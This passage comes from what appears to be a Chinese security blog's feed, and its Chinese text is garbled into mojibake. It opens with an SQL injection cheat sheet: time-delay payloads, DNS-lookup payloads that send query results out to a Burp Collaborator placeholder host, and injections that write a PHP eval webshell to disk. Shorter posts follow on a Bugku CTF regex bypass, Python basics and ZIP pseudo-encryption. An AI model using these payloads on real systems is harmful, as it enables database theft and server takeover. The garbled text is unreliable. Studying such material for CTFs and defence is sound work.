Êï∞ÊçÆÂ∫ìÈÄö‰ø°ÔºåËøôÂÅ∂Â∞îÊòØÂèØËÉΩÁöÑ„ÄÇ</p><h2 id="Êó∂Èó¥Âª∂Ëøü"><a href="#Êó∂Èó¥Âª∂Ëøü" class="headerlink" title="Êó∂Èó¥Âª∂Ëøü"></a>Êó∂Èó¥Âª∂Ëøü</h2><p>Â§ÑÁêÜÊü•ËØ¢Êó∂ÔºåÊÇ®ÂèØËÉΩ‰ºöÂú®Êï∞ÊçÆÂ∫ì‰∏≠ÈÄ†ÊàêÊó∂Èó¥Âª∂Ëøü„ÄÇ‰ª•‰∏ãÂ∞ÜÂØºËá¥ 10 ÁßíÁöÑÊó†Êù°‰ª∂Êó∂Èó¥Âª∂Ëøü„ÄÇ</p><table><thead><tr><th align="left">Áî≤È™®Êñá</th><th><code>dbms_pipe.receive_message((&#39;a&#39;),10)</code></th></tr></thead><tbody><tr><td align="left">ÂæÆËΩØ</td><td><code>WAITFOR DELAY &#39;0:0:10&#39;</code></td></tr><tr><td align="left">Êï∞ÊçÆÂ∫ì</td><td><code>SELECT pg_sleep(10)</code></td></tr><tr><td align="left">MySQL</td><td><code>SELECT SLEEP(10)</code></td></tr></tbody></table><h2 id="ÊúâÊù°‰ª∂ÁöÑÊó∂Èó¥Âª∂Ëøü"><a href="#ÊúâÊù°‰ª∂ÁöÑÊó∂Èó¥Âª∂Ëøü" class="headerlink" title="ÊúâÊù°‰ª∂ÁöÑÊó∂Èó¥Âª∂Ëøü"></a>ÊúâÊù°‰ª∂ÁöÑÊó∂Èó¥Âª∂Ëøü</h2><p>ÊÇ®ÂèØ‰ª•ÊµãËØïÂçï‰∏™Â∏ÉÂ∞îÊù°‰ª∂Âπ∂Âú®Êù°‰ª∂‰∏∫ÁúüÊó∂Ëß¶ÂèëÊó∂Èó¥Âª∂Ëøü„ÄÇ</p><p>| Áî≤È™®Êñá | <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN &#39;a&#39;||dbms_pipe.receive_message((&#39;a&#39;),10) ELSE NULL END FROM dual</code> |<br>| :‚Äî‚Äì | ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî |<br>| ÂæÆËΩØ   | <code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#39;0:0:10&#39;</code>            |<br>| Êï∞ÊçÆÂ∫ì | <code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code> |<br>| MySQL  | <code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),&#39;a&#39;)</code>               |</p><h2 id="DNSÊü•ËØ¢"><a href="#DNSÊü•ËØ¢" class="headerlink" title="DNSÊü•ËØ¢"></a>DNSÊü•ËØ¢</h2><p>ÊÇ®ÂèØ‰ª•‰ΩøÊï∞ÊçÆÂ∫ìÂØπÂ§ñÈÉ®ÂüüÊâßË°å DNS Êü•Êâæ„ÄÇ‰∏∫Ê≠§ÔºåÊÇ®ÈúÄË¶Å‰ΩøÁî®<a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator ÂÆ¢Êà∑Á´Ø</a>ÁîüÊàê‰∏Ä‰∏™ÊÇ®Â∞ÜÂú®ÊîªÂáª‰∏≠‰ΩøÁî®ÁöÑÂîØ‰∏Ä Burp Collaborator Â≠êÂüüÔºåÁÑ∂ÂêéËΩÆËØ¢ Collaborator ÊúçÂä°Âô®‰ª•Á°ÆËÆ§ÊòØÂê¶ËøõË°å‰∫Ü DNS Êü•Êâæ„ÄÇ</p><table><thead><tr><th align="left">Áî≤È™®Êñá</th><th>‰ª•‰∏ãÊäÄÊúØÂà©Áî® XML Â§ñÈÉ®ÂÆû‰Ωì ( <a href="https://portswigger.net/web-security/xxe">XXE</a> ) ÊºèÊ¥ûËß¶Âèë DNS Êü•Êâæ„ÄÇËØ•ÊºèÊ¥ûÂ∑≤Ë¢´‰øÆË°•Ôºå‰ΩÜÂ≠òÂú®ËÆ∏Â§öÊú™‰øÆË°•ÁöÑ Oracle ÂÆâË£ÖÔºö <code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code>  ‰ª•‰∏ãÊäÄÊúØÈÄÇÁî®‰∫éÂÆåÂÖ®‰øÆË°•ÁöÑ Oracle ÂÆâË£ÖÔºå‰ΩÜÈúÄË¶ÅÊèêÂçáÊùÉÈôêÔºö <code>SELECT UTL_INADDR.get_host_address(&#39;BURP-COLLABORATOR-SUBDOMAIN&#39;)</code></th></tr></thead><tbody><tr><td align="left">ÂæÆËΩØ</td><td><code>exec master..xp_dirtree &#39;//BURP-COLLABORATOR-SUBDOMAIN/a&#39;</code></td></tr><tr><td align="left">Êï∞ÊçÆÂ∫ì</td><td><code>copy (SELECT &#39;&#39;) to program &#39;nslookup BURP-COLLABORATOR-SUBDOMAIN&#39;</code></td></tr><tr><td align="left">MySQL</td><td>‰ª•‰∏ãÊäÄÊúØ‰ªÖÈÄÇÁî®‰∫é WindowsÔºö <code>LOAD_FILE(&#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\\a&#39;)</code> <code>SELECT ... INTO OUTFILE &#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#39;</code></td></tr></tbody></table><h2 id="Â∏¶Êï∞ÊçÆÊ≥ÑÈú≤ÁöÑ-DNS-Êü•Êâæ"><a href="#Â∏¶Êï∞ÊçÆÊ≥ÑÈú≤ÁöÑ-DNS-Êü•Êâæ" class="headerlink" title="Â∏¶Êï∞ÊçÆÊ≥ÑÈú≤ÁöÑ DNS Êü•Êâæ"></a>Â∏¶Êï∞ÊçÆÊ≥ÑÈú≤ÁöÑ DNS Êü•Êâæ</h2><p>ÊÇ®ÂèØ‰ª•‰ΩøÊï∞ÊçÆÂ∫ìÂØπÂåÖÂê´Ê≥®ÂÖ•Êü•ËØ¢ÁªìÊûúÁöÑÂ§ñÈÉ®ÂüüÊâßË°å DNS Êü•Êâæ„ÄÇ‰∏∫Ê≠§ÔºåÊÇ®ÈúÄË¶Å‰ΩøÁî®<a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client">Burp Collaborator ÂÆ¢Êà∑Á´Ø</a>ÁîüÊàêÊÇ®Â∞ÜÂú®ÊîªÂáª‰∏≠‰ΩøÁî®ÁöÑÂîØ‰∏Ä Burp Collaborator Â≠êÂüüÔºåÁÑ∂ÂêéËΩÆËØ¢ Collaborator ÊúçÂä°Âô®‰ª•Ê£ÄÁ¥¢‰ªª‰Ωï DNS ‰∫§‰∫íÁöÑËØ¶ÁªÜ‰ø°ÊÅØÔºåÂåÖÊã¨Ê≥ÑÈú≤ÁöÑÊï∞ÊçÆ„ÄÇ</p><p>| Áî≤È™®Êñá | <code>SELECT EXTRACTVALUE(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://&#39;||(SELECT YOUR-QUERY-HERE)||&#39;.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code> |<br>| :‚Äî‚Äì | ‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî |<br>| ÂæÆËΩØ   | <code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.BURP-COLLABORATOR-SUBDOMAIN/a&quot;&#39;)</code> |<br>| Êï∞ÊçÆÂ∫ì | <code>create OR replace function f() returns void as $$declare c text;declare p text;beginSELECT into p (SELECT YOUR-QUERY-HERE);c := &#39;copy (SELECT &#39;&#39;&#39;&#39;) to program &#39;&#39;nslookup &#39;||p||&#39;.BURP-COLLABORATOR-SUBDOMAIN&#39;&#39;&#39;;execute c;END;$$ language plpgsql security definer;SELECT f();</code> |<br>| MySQL  | ‰ª•‰∏ãÊäÄÊúØ‰ªÖÈÄÇÁî®‰∫é WindowsÔºö <code>SELECT YOUR-QUERY-HERE INTO OUTFILE &#39;\\\\BURP-COLLABORATOR-SUBDOMAIN\a&#39;</code> |</p><h2 id="SQLÊ≥®ÂÖ•ÊÄé‰πàÂÜôÂÖ•webshellÔºü"><a href="#SQLÊ≥®ÂÖ•ÊÄé‰πàÂÜôÂÖ•webshellÔºü" class="headerlink" title="SQLÊ≥®ÂÖ•ÊÄé‰πàÂÜôÂÖ•webshellÔºü"></a>SQLÊ≥®ÂÖ•ÊÄé‰πàÂÜôÂÖ•webshellÔºü</h2><h3 id="Êù°‰ª∂Ôºö"><a href="#Êù°‰ª∂Ôºö" class="headerlink" title="Êù°‰ª∂Ôºö"></a>Êù°‰ª∂Ôºö</h3><p>1„ÄÅÁü•ÈÅìwebÁªùÂØπË∑ØÂæÑ</p><p>2„ÄÅÊúâÊñá‰ª∂ÂÜôÂÖ•ÊùÉÈôê(‰∏ÄËà¨ÊÉÖÂÜµÂè™ÊúâROOTÁî®Êà∑Êúâ)</p><p>3„ÄÅÊï∞ÊçÆÂ∫ìÂºÄÂêØ‰∫Üsecure_file_privËÆæÁΩÆ</p><p>‚Äã    ÁÑ∂ÂêéÂ∞±ËÉΩÁî®select into outfileÂÜôÂÖ•webshell</p><h3 id="Â∏∏ËßÅÊâãÊ≥ïÔºö"><a href="#Â∏∏ËßÅÊâãÊ≥ïÔºö" class="headerlink" title="Â∏∏ËßÅÊâãÊ≥ïÔºö"></a>Â∏∏ËßÅÊâãÊ≥ïÔºö</h3><p><strong>ËÅîÂêàÊ≥®ÂÖ•ÂÜôÂÖ•</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,"&lt;?php @eval($_POST['</span>shell<span class="token string">']);?>",3 into outfile '</span><span class="token constant">C</span><span class="token operator">:</span>\\phpstudy\\<span class="token constant">WWW</span>\\sqli\\shell<span class="token punctuation">.</span>php'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>dumpfileÂáΩÊï∞ÂÜôÂÖ•</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,"&lt;?php @eval($_POST['</span>shell<span class="token string">']);?>",3 into dumpfile '</span><span class="token constant">C</span><span class="token operator">:</span>\\phpstudy\\<span class="token constant">WWW</span>\\sqli\\shell<span class="token punctuation">.</span>php'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>lines terminated by ÂÜôÂÖ•</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/shell.php'</span> lines terminated by <span class="token string">'&lt;?php phpinfo()?>'</span><span class="token punctuation">;</span><span class="token comment">//lines terminated by ÂèØ‰ª•ÁêÜËß£‰∏∫ ‰ª•ÊØèË°åÁªàÊ≠¢ÁöÑ‰ΩçÁΩÆÊ∑ªÂä† xx ÂÜÖÂÆπ„ÄÇ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>lines starting by ÂÜôÂÖ•</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/shell.php'</span> lines starting by <span class="token string">'&lt;?php phpinfo()?>'</span><span class="token punctuation">;</span><span class="token comment">//Âà©Áî® lines starting by ËØ≠Âè•ÊãºÊé•webshellÁöÑÂÜÖÂÆπ„ÄÇlines starting by ÂèØ‰ª•ÁêÜËß£‰∏∫ ‰ª•ÊØèË°åÂºÄÂßãÁöÑ‰ΩçÁΩÆÊ∑ªÂä† xx ÂÜÖÂÆπ„ÄÇ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>fields terminated by ÂÜôÂÖ•</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/work/shell.php'</span> fields terminated by <span class="token string">'&lt;?php phpinfo() ?>'</span><span class="token punctuation">;</span><span class="token comment">//Âà©Áî® fields terminated by ËØ≠Âè•ÊãºÊé•webshellÁöÑÂÜÖÂÆπ„ÄÇfields terminated by ÂèØ‰ª•ÁêÜËß£‰∏∫ ‰ª•ÊØè‰∏™Â≠óÊÆµÁöÑ‰ΩçÁΩÆÊ∑ªÂä† xx ÂÜÖÂÆπ„ÄÇ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>columns terminated by ÂÜôÂÖ•</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span> into outfile <span class="token string">'C:/wamp64/www/shell.php'</span> <span class="token constant">COLUMNS</span> terminated by <span class="token string">'&lt;?php phpinfo() ?>'</span><span class="token punctuation">;</span><span class="token comment">//Âà©Áî® fields terminated by ËØ≠Âè•ÊãºÊé•webshellÁöÑÂÜÖÂÆπ„ÄÇfields terminated by ÂèØ‰ª•ÁêÜËß£‰∏∫ ‰ª•ÊØè‰∏™Â≠óÊÆµÁöÑ‰ΩçÁΩÆÊ∑ªÂä† xx ÂÜÖÂÆπ„ÄÇ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>sqlmapÂÜôÂÖ•</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ÂÜôÔºö<span class="token punctuation">(</span>Ë¶ÅÂÜôÁöÑÊñá‰ª∂ÔºåÂøÖÈ°ªÂú®kaliÊú¨Êú∫ÈáåÊúâ<span class="token punctuation">)</span>ÂÜôÂÖ•Âà∞ <span class="token operator">/</span>tmp ÁõÆÂΩï‰∏ã  sqlmap <span class="token operator">-</span>u "http:<span class="token comment">//127.0.0.1/index.php?page=user-info.php&amp;username=a%27f%27v&amp;password=afv&amp;us</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku‰πãwebÈÉ®ÂàÜËß£È¢òÊÄùË∑Ø</title>
      <link href="/2023/01/15/Bugku%E4%B9%8Bweb%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
      <url>/2023/01/15/Bugku%E4%B9%8Bweb%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="No-one-knows-regex-better-than-me"><a href="#No-one-knows-regex-better-than-me" class="headerlink" title="No one knows regex better than me"></a>No one knows regex better than me</h2><p><strong>Áü•ËØÜÁÇπÔºöÊ≠£ÂàôË°®ËææÂºè</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$zero</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'zero'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$first</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'first'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$second</span><span class="token operator">=</span><span class="token variable">$zero</span><span class="token operator">.</span><span class="token variable">$first</span><span class="token punctuation">;</span><span class="token comment">//Â∞ÜzeroÂíåfirstËøûÊé•Ëµ∑Êù•</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/Yeedo|wants|a|girl|friend|or|a|flag/i"</span><span class="token punctuation">,</span><span class="token variable">$second</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$key</span><span class="token operator">=</span><span class="token variable">$second</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\.\.|flag/"</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Noooood hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$third</span><span class="token operator">=</span><span class="token variable">$first</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\|\056\160\150\x70/i"</span><span class="token punctuation">,</span><span class="token variable">$third</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//  Ëß£Á†ÅÂêéÔºö‚Äù|.php‚Äú</span>            <span class="token variable">$end</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$third</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$zero</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//maybe flag in flag.php</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>error_reporting(0)<strong>Ë°®Á§∫‰∏çÊä•ÂëäÈîôËØØ<br>ÁÑ∂ÂêéÁî®$REQUEST‰º†zeroÂíåfirst<br>second&#x3D;zero.first<br>second‰∏≠Ë¶ÅÂåÖÂê´</strong>&#x2F;Yeedo|wants|a|girl|friend|or|a|flag&#x2F;<strong>ËøôÈáåÈù¢ÁöÑÂÖ∂‰∏≠‰∏Ä‰∏™ÔºåÂπ∂‰∏î‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜô„ÄÇ<br>ÁÑ∂Âêékey&#x3D;second&#x3D;zero.first<br>key‰∏≠‰∏çËÉΩÊúâ</strong>..<strong>Âíå</strong>flag</strong>„ÄÇ<br>Âè¶Â§ñÔºåthird&#x3D;first„ÄÇ<br><strong>\056\160\150</strong>‰∏∫ÂÖ´ËøõÂà∂Ôºå<strong>\x70</strong>‰∏∫ÂçÅÂÖ≠ËøõÂà∂<br>third‰∏≠Ë¶ÅÊúâ**|.php<strong>Ôºå</strong>substr**ÊòØÊà™ÂèñÂ≠óÁ¨¶ÔºåendÂèñÂÄºÊó∂‰ªéthirdÁöÑÁ¨¨5‰ΩçÂºÄÂßãÂèñÂÄºÔºåÁÑ∂ÂêéÂæóÂà∞base64Ëß£ÂØÜÁöÑzero‰∏éendËøûÊé•</p><p><strong>ÊÄùË∑ØÔºö</strong></p><p>ÂÖàÂú®zero‰∏≠‰º†ÂÖ•base74Âä†ÂØÜÂêéÁöÑflag(<strong>ZmxhZw&#x3D;&#x3D;</strong>)ÔºåÊèêÁ§∫ËØ¥flagÂú®flag.php‰∏≠ÔºåÊâÄ‰ª•Êàë‰ª¨ÊúÄÂêéË¶ÅÊûÑÈÄ†Âá∫flag.php„ÄÇËÄåÁ¨¨‰∏Ä‰∏™if‰ºöÊääflagËøáÊª§ÊéâÔºåÂèàËÄÉËôëÂà∞ÊúÄÂêé‰ºöËøõË°åbase64Ëß£Á†Å‰∏éfirstÊãºÊé•ÔºåÊâÄ‰ª•flagÂ∞±Áî®base64Âä†ÂØÜ‰º†Âà∞zero‰∏≠ÔºåÁî±‰∫éÁ¨¨‰∫å‰∏™ifÊää**..<strong>ËøáÊª§Êéâ‰∫ÜÔºåÂ¶ÇÊûúÁõ¥Êé•Âú®first‰∏≠‰º†ÂÖ•‰∫Ü.phpÂêéÔºåsecond‰ºöÂèòÊàêflag..phpÔºå‰ºöË¢´ËøáÊª§„ÄÇsudstr‰ºöÊà™ÂèñÊéâÂâçÂõõ‰∏™Â≠óÁ¨¶Ôºå‰ªéÁ¨¨‰∫î‰∏™Â≠óÁ¨¶ÂºÄÂßãÊé•Êî∂ÔºåÂπ∂‰∏îfirstÂÄº‰∏≠Ë¶ÅÂåÖÂê´</strong>&#x2F;Yeedo|wants|a|girl|friend|or|a|flag&#x2F;<strong>ÂÖ∂‰∏≠‰∏Ä‰∏™ÊâçËÉΩÊ≠£Â∏∏ÂæÄ‰∏ãËøõË°åÔºåÊâÄ‰ª•firstÁõ¥Êé•‰º†ÂÖ•</strong>flag|.php**<br><strong>ÊâÄ‰ª•ÊûÑÂª∫?zero&#x3D;ZmxhZw&#x3D;&#x3D;&amp;first&#x3D;flag|.php</strong></p><h3 id="x-y"><a href="#x-y" class="headerlink" title="x|y"></a>x|y</h3><p><strong>x|yÔºåÂåπÈÖç x Êàñ y„ÄÇ<br>‰æãÂ¶ÇÔºå‚Äôz|food‚Äô ËÉΩÂåπÈÖç ‚Äúz‚Äù Êàñ ‚Äúfood‚Äù„ÄÇ‚Äô(z|f)ood‚Äô ÂàôÂåπÈÖç ‚Äúzood‚Äù Êàñ ‚Äúfood‚Äù„ÄÇ</strong></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonÈÉ®ÂàÜÁü•ËØÜÁÇπ</title>
      <link href="/2023/01/13/python%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2023/01/13/python%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="ÂàóË°®ÁöÑÊñπÊ≥ï"><a href="#ÂàóË°®ÁöÑÊñπÊ≥ï" class="headerlink" title="ÂàóË°®ÁöÑÊñπÊ≥ï"></a>ÂàóË°®ÁöÑÊñπÊ≥ï</h2><p><img src="https://img-blog.csdnimg.cn/8199ffcbcaed48d289971c6f7fcef868.png#pic_center" alt="1"></p><h2 id="ÂàóË°®ÁöÑÁâπÁÇπ"><a href="#ÂàóË°®ÁöÑÁâπÁÇπ" class="headerlink" title="ÂàóË°®ÁöÑÁâπÁÇπ"></a>ÂàóË°®ÁöÑÁâπÁÇπ</h2><p><img src="https://img-blog.csdnimg.cn/931e8889a21040b7a22be771851fec85.png#pic_center" alt="2"></p><h2 id="whileÂæ™ÁéØ‰∏éforÂæ™ÁéØÁöÑÂØπÊØî"><a href="#whileÂæ™ÁéØ‰∏éforÂæ™ÁéØÁöÑÂØπÊØî" class="headerlink" title="whileÂæ™ÁéØ‰∏éforÂæ™ÁéØÁöÑÂØπÊØî"></a>whileÂæ™ÁéØ‰∏éforÂæ™ÁéØÁöÑÂØπÊØî</h2><p><img src="https://img-blog.csdnimg.cn/9e00c957396d443cb930f782490b7c06.png#pic_center" alt="3"></p><h2 id="Â≠óÁ¨¶‰∏≤Â∏∏Áî®Êìç‰Ωú"><a href="#Â≠óÁ¨¶‰∏≤Â∏∏Áî®Êìç‰Ωú" class="headerlink" title="Â≠óÁ¨¶‰∏≤Â∏∏Áî®Êìç‰Ωú"></a>Â≠óÁ¨¶‰∏≤Â∏∏Áî®Êìç‰Ωú</h2><p><img src="https://img-blog.csdnimg.cn/6f36aeff3ac04f34ba832b2b58ecea21.png#pic_center" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> Áü•ËØÜÁÇπ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ptython </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip‰º™Âä†ÂØÜ</title>
      <link href="/2023/01/10/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
      <url>/2023/01/10/zip%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p><strong>zip‰º™Âä†ÂØÜ</strong>ÊòØÂú®Êñá‰ª∂Â§¥ÁöÑÂä†ÂØÜÊ†áÂøó‰ΩçÂÅö‰øÆÊîπÔºåËøõËÄåÂÜçÊâìÂºÄÊñá‰ª∂Êó∂ËØÜË¢´Âà´‰∏∫Âä†ÂØÜÂéãÁº©ÂåÖ</p><p>‰∏Ä‰∏™ ZIP Êñá‰ª∂Áî±<strong>‰∏â‰∏™ÈÉ®ÂàÜ</strong>ÁªÑÊàêÔºö</p><p>ÂéãÁº©Ê∫êÊñá‰ª∂Êï∞ÊçÆÂå∫+ÂéãÁº©Ê∫êÊñá‰ª∂ÁõÆÂΩïÂå∫+ÂéãÁº©Ê∫êÊñá‰ª∂ÁõÆÂΩïÁªìÊùüÊ†áÂøó</p><h2 id="ÂéãÁº©Ê∫êÊñá‰ª∂Êï∞ÊçÆÂå∫Ôºö"><a href="#ÂéãÁº©Ê∫êÊñá‰ª∂Êï∞ÊçÆÂå∫Ôºö" class="headerlink" title="ÂéãÁº©Ê∫êÊñá‰ª∂Êï∞ÊçÆÂå∫Ôºö"></a>ÂéãÁº©Ê∫êÊñá‰ª∂Êï∞ÊçÆÂå∫Ôºö</h2><p>50 4B 03 04ÔºöËøôÊòØÂ§¥Êñá‰ª∂Ê†áËÆ∞Ôºà0x04034b50Ôºâ</p><p>14 00ÔºöËß£ÂéãÊñá‰ª∂ÊâÄÈúÄ pkware ÁâàÊú¨</p><p>00 00ÔºöÂÖ®Â±ÄÊñπÂºè‰ΩçÊ†áËÆ∞ÔºàÊúâÊó†Âä†ÂØÜÔºâ</p><p>08 00ÔºöÂéãÁº©ÊñπÂºè</p><p>5A 7EÔºöÊúÄÂêé‰øÆÊîπÊñá‰ª∂Êó∂Èó¥</p><p>F7 46ÔºöÊúÄÂêé‰øÆÊîπÊñá‰ª∂Êó•Êúü</p><p>16 B5 80 14ÔºöCRC-32Ê†°È™åÔºà1480B516Ôºâ</p><p>19 00 00 00ÔºöÂéãÁº©ÂêéÂ∞∫ÂØ∏Ôºà25Ôºâ</p><p>17 00 00 00ÔºöÊú™ÂéãÁº©Â∞∫ÂØ∏Ôºà23Ôºâ</p><p>07 00ÔºöÊñá‰ª∂ÂêçÈïøÂ∫¶</p><p>00 00ÔºöÊâ©Â±ïËÆ∞ÂΩïÈïøÂ∫¶</p><h2 id="ÂéãÁº©Ê∫êÊñá‰ª∂ÁõÆÂΩïÂå∫Ôºö"><a href="#ÂéãÁº©Ê∫êÊñá‰ª∂ÁõÆÂΩïÂå∫Ôºö" class="headerlink" title="ÂéãÁº©Ê∫êÊñá‰ª∂ÁõÆÂΩïÂå∫Ôºö"></a>ÂéãÁº©Ê∫êÊñá‰ª∂ÁõÆÂΩïÂå∫Ôºö</h2><p>50 4B 01 02ÔºöÁõÆÂΩï‰∏≠Êñá‰ª∂Êñá‰ª∂Â§¥Ê†áËÆ∞(0x02014b50)</p><p>3F 00ÔºöÂéãÁº©‰ΩøÁî®ÁöÑ pkware ÁâàÊú¨</p><p>14 00ÔºöËß£ÂéãÊñá‰ª∂ÊâÄÈúÄ pkware ÁâàÊú¨</p><p>00 00ÔºöÂÖ®Â±ÄÊñπÂºè‰ΩçÊ†áËÆ∞ÔºàÊúâÊó†Âä†ÂØÜÔºåËøô‰∏™Êõ¥ÊîπËøôÈáåËøõË°å‰º™Âä†ÂØÜÔºåÊîπ‰∏∫09 00ÊâìÂºÄÂ∞±‰ºöÊèêÁ§∫ÊúâÂØÜÁ†Å‰∫ÜÔºâ</p><p>08 00ÔºöÂéãÁº©ÊñπÂºè</p><p>5A 7EÔºöÊúÄÂêé‰øÆÊîπÊñá‰ª∂Êó∂Èó¥</p><p>F7 46ÔºöÊúÄÂêé‰øÆÊîπÊñá‰ª∂Êó•Êúü</p><p>16 B5 80 14ÔºöCRC-32Ê†°È™åÔºà1480B516Ôºâ</p><p>19 00 00 00ÔºöÂéãÁº©ÂêéÂ∞∫ÂØ∏Ôºà25Ôºâ</p><p>17 00 00 00ÔºöÊú™ÂéãÁº©Â∞∫ÂØ∏Ôºà23Ôºâ</p><p>07 